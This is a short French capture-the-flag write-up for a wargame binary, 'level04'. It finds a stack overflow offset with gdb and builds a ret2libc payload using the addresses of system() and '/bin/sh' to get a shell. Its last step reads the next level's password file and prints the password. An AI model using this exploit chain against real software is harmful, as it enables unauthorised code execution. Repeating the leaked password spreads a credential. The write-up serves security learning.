# Level04

```shell
$ ./level04
Give me some shellcode, k
Hello World
child is exiting...

$ python -c 'print("A" * 200)' | ./level04
Give me some shellcode, k
Give me some shellcode, k
Ctrl+C
```

Il y a deux methode pour trouver la bon nombre de `A` a entrer:

```bash
$ gdb level04 -q
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.

(gdb) set follow-fork-mode child

(gdb) run
Starting program: /home/users/level04/level04
[New process 2245]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2245]
0x41326641 in ?? ()

# go on wiremask and he will give you: Register value 0x41326641 => Offset 156
```

Or

```shell
$ python -c 'print("A" * 155)' | ./level04
Give me some shellcode, k
child is exiting...

$ python -c 'print("A" * 156)' | ./level04
Give me some shellcode, k
Give me some shellcode, k
Ctrl+C
```

On va essayer de faire un ret2libc. Notre argument va ressembler a

```shell
$ python -c 'print("A" * 156 + "AdresseSystem" + "OSEF" + "AdresseBinSH")'
```

allons recuperer ces deux adresses

```shell
$ gdb level04 -q
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.

(gdb) b *main
Breakpoint 1 at 0x80486c8

(gdb) run
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486c8 in main ()

(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

On trouve alors `AdresseSystem = 0xf7e6aed0` et `AdresseBinSH = 0xf7f897ec`, plus qu'a remplacer et essayer

```shell
$ (python -c 'print("A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "OSEF" + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

lien: https://wiremask.eu/tools/buffer-overflow-pattern-generator/
